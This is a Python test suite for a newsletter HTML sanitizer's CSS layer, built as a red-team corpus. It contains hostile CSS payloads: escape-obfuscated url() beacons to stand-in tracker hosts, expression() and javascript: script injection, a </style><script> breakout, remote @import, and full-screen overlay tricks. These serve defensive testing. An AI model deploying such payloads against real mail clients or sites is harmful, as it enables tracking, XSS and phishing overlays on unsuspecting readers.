"""Attack corpus for the CSS sanitizer. Each red-team payload must be neutralized;
   legitimate newsletter styling must survive.  Run: python3 test_css_sanitizer.py"""
import sanitize_html as S


class Ctx:
    """Minimal stand-in for _San: the CSS layer only touches these attrs."""
    def __init__(self, load_images=False):
        self.load_images = load_images
        self.blocked_images = 0
        self.blocked_css_urls = 0


def inline(v, load_images=False):
    c = Ctx(load_images)
    return S.sanitize_inline_style(v, c), c


def sheet(css, load_images=False):
    c = Ctx(load_images)
    return S.sanitize_css_stylesheet(css, c), c


# ── W1/W3: decode-desync — escaped url() must be decoded BEFORE gating ────────
def test_escaped_url_keyword_is_gated():
    out, c = inline(r"background-image:\75rl(http://tracker/beacon.png)")
    assert "tracker" not in out and "url(" not in out.lower()

def test_escaped_url_paren_is_gated():
    out, _ = inline(r"background:url\28http://tracker/x.png\29")
    assert "tracker" not in out and "url(" not in out.lower()

def test_split_url_letters_decoded():
    out, _ = inline(r"background:u\72 l(http://evil/p.png)")  # \72 == 'r'
    assert "evil" not in out and "url(" not in out.lower()

def test_residual_backslash_after_decode_drops():
    # A TRUE residual backslash (\\ -> one literal \) is malformed/recursive -> drop, even with consent.
    out, _ = inline(r"background:url(https://evil\\x.png)", load_images=True)
    assert out == ""
    # \/ is a LEGIT escaped slash: decodes cleanly to a valid URL, so it is correctly GATED
    # (blocked, no beacon) without consent — not silently passed.
    out2, c2 = inline(r"background:url(https:\/\/evil/y.png)", load_images=False)
    assert out2 == "" and c2.blocked_css_urls == 1

def test_emit_copy_equals_match_copy_no_reexpand():
    out, _ = inline(r"width:expr/* */ession(alert(1))")
    assert out == ""


# ── W2: §4 contradiction — any bad url() token drops the WHOLE declaration ────
def test_multi_url_data_plus_remote_drops_entire_decl():
    out, c = inline(
        "background:url(data:image/png;base64,AAAA) , url(https://evil/beacon?id=USER)",
        load_images=False)
    assert "evil" not in out and "data:image" not in out
    assert c.blocked_css_urls == 1

def test_remote_url_blocked_counts_once():
    out, c = inline("background:url(https://t/a) , url(https://t/b)", load_images=False)
    assert out == "" and c.blocked_css_urls == 1


# ── url() scheme gating ──────────────────────────────────────────────────────
def test_data_svg_url_dropped():
    out, _ = inline("background:url(data:image/svg+xml;base64,PHN2Zz4=)", load_images=True)
    assert out == ""

def test_javascript_url_dropped():
    out, _ = inline("background:url(javascript:alert(1))", load_images=True)
    assert out == ""

def test_data_png_url_kept_without_consent():
    out, c = inline("background-image:url(data:image/png;base64,iVBORw0KGgo=)",
                    load_images=False)
    assert out.startswith("background-image:url(")
    assert "data:image/png" in out and c.blocked_css_urls == 0

def test_remote_url_kept_with_consent():
    out, c = inline("background:url(https://cdn.example.com/hero.png)", load_images=True)
    assert 'url("https://cdn.example.com/hero.png")' in out and c.blocked_css_urls == 0

def test_url_on_nonurl_property_dropped():
    out, _ = inline("color:url(https://evil/x)", load_images=True)
    assert out == ""


# ── value denylist ───────────────────────────────────────────────────────────
def test_expression_dropped():
    assert inline("width:expression(alert(1))")[0] == ""

def test_behavior_dropped():
    assert inline("behavior:url(#default#xss)")[0] == ""

def test_moz_binding_dropped():
    assert inline("-moz-binding:url(http://evil/x.xml)")[0] == ""

def test_angle_bracket_in_value_dropped():
    assert inline("font-family:'</style><script>'")[0] == ""

def test_var_function_dropped():
    assert inline("background:var(--x, url(http://tracker))", load_images=True)[0] == ""


# ── overlay / curtain hardening ──────────────────────────────────────────────
def test_position_fixed_dropped():
    assert inline("position:fixed")[0] == ""

def test_position_absolute_dropped():
    assert inline("position:absolute")[0] == ""

def test_position_escaped_fixed_dropped():
    assert inline(r"position:f\69xed")[0] == ""   # \69 == 'i' -> fixed -> dropped

def test_position_relative_kept():
    assert inline("position:relative")[0] == "position:relative"

def test_viewport_height_curtain_dropped():
    assert inline("height:100vh")[0] == ""
    assert inline("min-height:100vh")[0] == ""

def test_percent_height_curtain_dropped():
    assert inline("height:100%")[0] == ""

def test_zindex_dropped():
    assert inline("z-index:9999")[0] == ""

def test_transform_dropped():
    assert inline("transform:translateY(-100px)")[0] == ""


# ── <style> block / breakout ─────────────────────────────────────────────────
def test_import_rule_dropped():
    out, _ = sheet('@import url(http://evil/x.css); p{color:red}')
    assert "evil" not in out and "@import" not in out
    assert "color:red" in out

def test_font_face_dropped():
    out, _ = sheet('@font-face{font-family:x;src:url(http://evil/f.woff)}')
    assert "evil" not in out and "@font-face" not in out

def test_style_breakout_neutralized():
    out, _ = sheet('p{color:red}</style><script>alert(1)</script>')
    assert "<" not in out and ">" not in out and "script" not in out.lower()

def test_media_query_recurses_and_keeps_safe():
    out, _ = sheet('@media (max-width:600px){ .a{color:#333} }')
    assert "@media" in out and "color:#333" in out

def test_media_with_url_prelude_dropped():
    out, _ = sheet('@media url(evil){ .a{color:red} }')
    assert "evil" not in out

def test_keyframes_dropped():
    out, _ = sheet('@keyframes spin{from{opacity:0}to{opacity:1}}')
    assert "@keyframes" not in out and "spin" not in out

def test_selector_with_angle_bracket_drops_rule():
    out, _ = sheet('a<b{color:red}')
    assert "color:red" not in out and "<" not in out


# ── DoS bounds ───────────────────────────────────────────────────────────────
def test_oversized_inline_dropped_fast():
    out, _ = inline("color:red;" + "A" * 100_000)
    assert out == ""                       # > 4096 raw cap -> dropped pre-normalize

def test_unterminated_comment_no_hang():
    out, _ = sheet("p{color:red} /* unterminated " + "x" * 10_000)
    assert "color:red" in out

def test_unterminated_brace_no_hang():
    out, _ = sheet("p{color:red")
    assert isinstance(out, str)


# ── legitimate newsletter styling SURVIVES ───────────────────────────────────
def test_newsletter_inline_styles_survive():
    out, _ = inline("color:#1a1a1a; font-family:Helvetica,Arial,sans-serif; "
                    "font-size:16px; line-height:1.5; padding:12px 16px; "
                    "background-color:#fbf7ef; border-radius:8px; text-align:center")
    for frag in ("color:#1a1a1a", "font-size:16px", "background-color:#fbf7ef",
                 "border-radius:8px", "text-align:center"):
        assert frag in out

def test_newsletter_data_image_hero_survives():
    out, c = inline("background-image:url(data:image/jpeg;base64,/9j/4AAQSkZJRg==)",
                    load_images=False)
    assert "data:image/jpeg" in out and c.blocked_css_urls == 0

def test_newsletter_stylesheet_survives():
    css = ('.btn{background-color:#0a66c2;color:#fff;padding:10px 18px;'
           'border-radius:6px;text-decoration:none;display:inline-block}'
           '@media (max-width:480px){.btn{display:block;width:100%}}')
    out, _ = sheet(css)
    assert "background-color:#0a66c2" in out
    assert "border-radius:6px" in out
    assert "@media" in out

def test_font_casing_preserved():
    out, _ = inline("font-family:Georgia,'Times New Roman',serif")
    assert "Georgia" in out

def test_text_shadow_and_box_shadow_kept():
    out, _ = inline("text-shadow:1px 1px 2px #000; box-shadow:0 2px 4px rgba(0,0,0,.2)")
    assert "text-shadow:" in out and "box-shadow:" in out


if __name__ == "__main__":
    import sys
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    failed = 0
    for fn in fns:
        try:
            fn()
            print("PASS", fn.__name__)
        except AssertionError as e:
            failed += 1
            print("FAIL", fn.__name__, repr(e))
        except Exception as e:
            failed += 1
            print("ER:U", fn.__name__, repr(e))
    print("\n%d/%d passed" % (len(fns) - failed, len(fns)))
    sys.exit(1 if failed else 0)
